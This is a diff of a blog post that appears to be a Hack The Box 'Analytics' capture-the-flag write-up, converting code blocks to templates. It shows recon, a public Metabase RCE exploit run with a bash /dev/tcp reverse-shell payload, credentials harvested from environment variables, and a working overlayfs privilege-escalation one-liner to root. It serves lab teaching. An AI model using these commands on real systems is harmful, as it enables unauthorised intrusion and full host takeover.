@@ -26,8 +26,7 @@ Let's go!  Let's break down the Analytics and steal that flag!
 
 First things first, give it a nmap scan to find the services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.233
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 01:08 AEDT
@@ -52,16 +51,18 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Update the /etc/hosts file with the domain indicated in the redirect.
 
-{% raw %}
-```bash
+{% capture catetchostsanalytics %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchostsanalytics %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.233    analytical.htb
@@ -70,14 +71,16 @@ Update the /etc/hosts file with the domain indicated in the redirect.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetchostsanalytics %}
+
+{% include codebox.html title="/etc/hosts" content=etchostsanalytics %}
 
 <br />
 Use curl to pull the headers to try and fingerprint the technology.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ curl -I http://analytical.htb
 HTTP/1.1 200 OK
@@ -89,8 +92,8 @@ Last-Modified: Fri, 25 Aug 2023 15:24:42 GMT
 Connection: keep-alive
 ETag: "64e8c7ba-4311"
 Accept-Ranges: bytes
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -104,10 +107,7 @@ Check the landing page the webserver is serving.
 <br />
 Check the landing page source code.
 
-{% raw %}
-```html
-view-source:http://analytical.htb/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -130,14 +130,13 @@ view-source:http://analytical.htb/
      
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://analytical.htb/' content=landingsource %}
 
 <br />
 Try fuzzing faster you fool to try and find subdomains.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://analytical.htb -H "Host: FUZZ.analytical.htb" -fw 4
 
@@ -165,16 +164,18 @@ ________________________________________________
 
 data                    [Status: 200, Size: 77858, Words: 3574, Lines: 28, Duration: 70ms]
 :: Progress: [114441/114441] :: Job [1/1] :: 3225 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Update the /etc/hosts file with the new subdomain that we just discovered.
 
-{% raw %}
-```bash
+{% capture catetchostsdata %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
-└─$ cat /etc/hosts               
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchostsdata %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.233    analytical.htb data.analytical.htb
@@ -183,8 +184,11 @@ Update the /etc/hosts file with the new subdomain that we just discovered.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetchostsdata %}
+
+{% include codebox.html title="/etc/hosts" content=etchostsdata %}
 
 <br />
 Check the data.analytics.htb landing page.
@@ -217,8 +221,7 @@ Check the GitHub for a potential exploit for the Metabase installation.
 <br />
 Check the {baseurl}/api/session/properties to get the set-up token.
 
-{% raw %}
-```json
+{% capture properties %}
 {
   "engines": {
 
@@ -235,26 +238,24 @@ Check the {baseurl}/api/session/properties to get the set-up token.
 
   }
 }
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='json' title='{baseurl}/api/session/properties' content=properties %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Download the exploit from the GitHub.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ wget https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/refs/heads/main/main.py
 --2025-02-02 01:45:36--  https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/refs/heads/main/main.py
@@ -267,8 +268,8 @@ Saving to: ‘main.py’
 main.py                                                    100%[========================================================================================================================================>]   2.04K  --.-KB/s    in 0s      
 
 2025-02-02 01:45:37 (41.6 MB/s) - ‘main.py’ saved [2091/2091]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Use revshells to craft a payload.
@@ -283,8 +284,7 @@ Use revshells to craft a payload.
 <br />
 Run the exploit using the token from earlier and the payload we just generated.  If that doesn't work, try different payloads until one does.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.12/443 0>&1" 
 [!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]
@@ -293,14 +293,13 @@ Run the exploit using the token from earlier and the payload we just generated. 
 [+] Encoding command
 [+] Making request
 [+] Payload sent
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
@@ -309,14 +308,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.11.233] 46544
 bash: cannot set terminal process group (1): Not a tty
 bash: no job control in this shell
 2e9ffa9225b3:/$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Copy linpeas.sh into the local working folder.
 
-{% raw %}
-```bash
+{% capture copypeaslocal %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ cp `locate linpeas.sh` .
                                                                                                                                                                                                                                             
@@ -327,14 +325,13 @@ linpeas.sh  main.py  nmap  nmapfull  vulnchk
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ python3 -m http.server                                                                                                             
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=copypeaslocal %}
 
 <br />
 Transfer linpeas.sh to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpeastovictim %}
 2e9ffa9225b3:/tmp$ wget http://10.10.16.12:8000/linpeas.sh 
 wget http://10.10.16.12:8000/linpeas.sh 
 Connecting to 10.10.16.12:8000 (10.10.16.12:8000)
@@ -345,14 +342,13 @@ linpeas.sh           100% |********************************|  820k  0:00:00 ETA
 'linpeas.sh' saved
 2e9ffa9225b3:/tmp$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeastovictim %}
 
 <br />
 Run linpeas and notice the environmental variables.  Looks like creds.
 
-{% raw %}
-```bash
+{% capture linpeasenv %}
 <snip>
 
 ╔══════════╣ Environment
@@ -388,14 +384,13 @@ PWD=/tmp
 MB_DB_FILE=//metabase.db/metabase.db
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=linpeasenv %}
 
 <br />
 Use the creds to ssh into the system.
 
-{% raw %}
-```bash
+{% capture sshmetalytics %}
 ┌──(kali㉿kali)-[~/Documents/htb/analytics]
 └─$ ssh metalytics@10.10.11.233
 The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
@@ -442,14 +437,13 @@ To check for new updates run: sudo apt update
 
 Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
 metalytics@analytics:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshmetalytics %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 metalytics@analytics:~$ cat user.txt
 <redacted>
 metalytics@analytics:~$ ip a
@@ -479,14 +473,13 @@ metalytics@analytics:~$ ip a
     link/ether ae:12:80:25:22:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet6 fe80::ac12:80ff:fe25:2229/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Transfer linpeas.sh to the vitcim ssh session.
 
-{% raw %}
-```bash
+{% capture transferpeas %}
 metalytics@analytics:~$ wget 10.10.16.12:8000/linpeas.sh
 --2025-02-01 15:14:28--  http://10.10.16.12:8000/linpeas.sh
 Connecting to 10.10.16.12:8000... connected.
@@ -499,14 +492,13 @@ linpeas.sh                                                 100%[================
 2025-02-01 15:14:30 (580 KB/s) - ‘linpeas.sh’ saved [839766/839766]
 
 metalytics@analytics:~$ chmod +x linpeas.sh 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Run the linpeas and note the linux version number.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 metalytics@analytics:~$ ./linpeas.sh 
 
 
@@ -525,8 +517,8 @@ Release:        22.04
 Codename:       jammy
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Google the Linux in the System Information to find an exploit.
@@ -571,18 +563,16 @@ Search the GitHub for that CVE to find an exploit.
 <br />
 Since it is a one-liner, just copy the juicy part instead of downloading.
 
-{% raw %}
-```bash
+{% capture runprivescexploit %}
 metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 root@analytics:~#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runprivescexploit %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@analytics:~# cat /root/root.txt
 <redacted>
 Try: apt install <deb name>
@@ -622,8 +612,8 @@ veth4c525f6: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 20  bytes 1672 (1.6 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, another on bites the dust.  Hopefully, you enjoyed the read.  Catch you on the next one!
